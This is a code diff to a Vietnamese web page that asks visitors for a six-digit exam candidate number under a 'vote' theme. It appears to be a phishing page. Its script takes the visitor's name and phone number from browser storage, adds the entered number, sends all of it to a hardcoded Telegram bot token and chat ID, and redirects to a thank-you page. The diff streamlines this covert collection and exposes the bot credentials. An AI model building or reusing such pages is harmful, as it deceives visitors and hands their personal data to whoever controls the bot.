@@ -33,16 +33,6 @@
             padding: 40px 20px;
             text-align: center;
         }
-        .sbd-badge {
-            display: inline-block;
-            background: linear-gradient(90deg, #FFD700, #FFB800);
-            color: #2B0764;
-            font-weight: bold;
-            padding: 8px 20px;
-            border-radius: 30px;
-            margin-bottom: 20px;
-            font-size: 18px;
-        }
         h1 { font-size: 36px; color: #FFD700; margin-bottom: 10px; }
         .subtitle { font-size: 18px; color: #E0E0E0; margin-bottom: 40px; }
         .form-box {
@@ -53,7 +43,6 @@
             box-shadow: 0 0 30px rgba(123, 47, 253, 0.3);
         }
         .form-box h2 { color: #FFD700; font-size: 24px; margin-bottom: 15px; }
-        .form-box p { color: #CCC; margin-bottom: 30px; }
         .sbd-inputs {
             display: flex;
             justify-content: center;
@@ -83,7 +72,6 @@
             cursor: pointer;
             box-shadow: 0 0 20px rgba(123, 47, 253, 0.6);
         }
-        .btn-confirm:disabled { opacity: 0.6; cursor: not-allowed; }
         .thongbao {
             margin-top: 25px;
             padding: 15px;
@@ -117,7 +105,6 @@
     </header>
 
     <div class="container">
-        <div class="sbd-badge">SBD _____</div>
         <h1>NHẬP SỐ BÁO DANH</h1>
         <p class="subtitle">Vui lòng nhập đúng số báo danh của thí sinh</p>
 
@@ -134,7 +121,7 @@
                 <input type="text" maxlength="1" oninput="autoNext(this, 6)">
             </div>
             
-            <button class="btn-confirm" id="btnXacNhan" onclick="guiThongTin()">XÁC NHẬN →</button>
+            <button class="btn-confirm" id="btnXacNhan" onclick="guiSBD()">XÁC NHẬN →</button>
             
             <div id="thongbao" class="thongbao"></div>
             
@@ -149,9 +136,8 @@
 
     <script>
         // ====================== ĐIỀN THÔNG TIN TELEGRAM CỦA BẠN VÀO ĐÂY ======================
-        const BOT_TOKEN = "8847014588:AAFjyPX1obUy13mfOmJrTek-UfdROPz7JOg";   // Ví dụ: 7123456789:AAG9x...
-        const CHAT_ID = "9845882038
-";    // Ví dụ: 1234567890
+        const BOT_TOKEN = "8847014588:AAFjyPX1obUy13mfOmJrTek-UfdROPz7JOg";
+        const CHAT_ID = "9845882038";
         // ===================================================================================
 
         function autoNext(input, soThuTu) {
@@ -161,12 +147,9 @@
             }
         }
 
-        async function guiThongTin() {
-            // Lấy thông tin từ trang chủ đã lưu
+        async function guiSBD() {
             const hoten = localStorage.getItem('hoten') || 'Chưa có';
             const dienthoai = localStorage.getItem('dienthoai') || 'Chưa có';
-
-            // Lấy Số Báo Danh người dùng vừa nhập
             const inputs = document.querySelectorAll('.sbd-inputs input');
             let sbd = '';
             inputs.forEach(i => sbd += i.value);
@@ -174,22 +157,19 @@
             const btn = document.getElementById('btnXacNhan');
             const tb = document.getElementById('thongbao');
 
-            // Kiểm tra đủ chưa
             if (sbd.length !== 6) {
-                hienThongBao("⚠️ Vui lòng nhập đủ 6 chữ số Số Báo Danh!", "loi");
+                hienTB("⚠️ Vui lòng nhập đủ 6 chữ số Số Báo Danh!", "loi");
                 return;
             }
             if (!hoten || !dienthoai) {
-                hienThongBao("⚠️ Vui lòng điền thông tin ở trang chủ trước!", "loi");
+                hienTB("⚠️ Vui lòng điền thông tin ở trang chủ trước!", "loi");
                 return;
             }
 
-            // Khóa nút khi đang gửi
-            btn.disabled = true;
             btn.innerText = "ĐANG GỬI...";
             tb.style.display = "none";
 
-            // Tạo nội dung gửi về Telegram
+            // Gửi TẤT CẢ thông tin về Telegram
             const tinNhan = `📩 BÌNH CHỌN MỚI
 ━━━━━━━━━━━━━━
 👤 Họ tên: ${hoten}
@@ -199,30 +179,30 @@
 ━━━━━━━━━━━━━━`;
 
             try {
-                // Gửi về Telegram
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                 const params = new URLSearchParams({
                     chat_id: CHAT_ID,
                     text: tinNhan,
                     parse_mode: "HTML"
                 });
-
                 await fetch(`${url}?${params}`);
 
-                // Thành công
-                hienThongBao("✅ Bình chọn thành công! Cảm ơn bạn!", "thanhcong");
-                localStorage.clear(); // Xóa dữ liệu cũ
+                hienTB("✅ Thành công! Đang chuyển trang...", "thanhcong");
+                localStorage.clear(); // Xóa dữ liệu
+
+                // Chuyển sang trang Cảm Ơn sau 1 giây
+                setTimeout(() => {
+                    window.location.href = "camon.html";
+                }, 1000);
 
             } catch (loi) {
-                hienThongBao("❌ Lỗi gửi! Kiểm tra lại Token và Chat ID.", "loi");
+                hienTB("⚠️ Lỗi gửi! Kiểm tra Token + Chat ID", "loi");
                 console.log("Lỗi:", loi);
-            } finally {
-                btn.disabled = false;
                 btn.innerText = "XÁC NHẬN →";
             }
         }
 
-        function hienThongBao(noiDung, kieu) {
+        function hienTB(noiDung, kieu) {
             const tb = document.getElementById('thongbao');
             tb.className = "thongbao " + kieu;
             tb.innerText = noiDung;
